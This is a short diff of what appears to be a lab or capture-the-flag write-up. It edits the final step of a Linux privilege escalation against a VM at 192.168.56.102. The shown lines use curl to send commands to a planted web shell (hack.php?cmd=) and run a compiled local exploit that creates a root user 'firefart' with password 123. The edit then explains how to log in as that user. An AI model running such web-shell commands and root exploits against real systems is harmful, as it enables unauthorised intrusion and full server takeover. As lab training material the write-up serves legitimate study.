@@ -31,4 +31,4 @@ After that - compile and run exploit with:
 	curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=ls" # check if it correct compile
 	curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=./exploit%20123"
 
-And we have `firefart` user with password 123 which is root. But I don't now how log in because su or su -c can't get `passwd` as argument.
+And we have `firefart` user with password 123 which is root. Now just go to the VM interface, and log in directly into `firefart` using password `123`. **You are root now!**
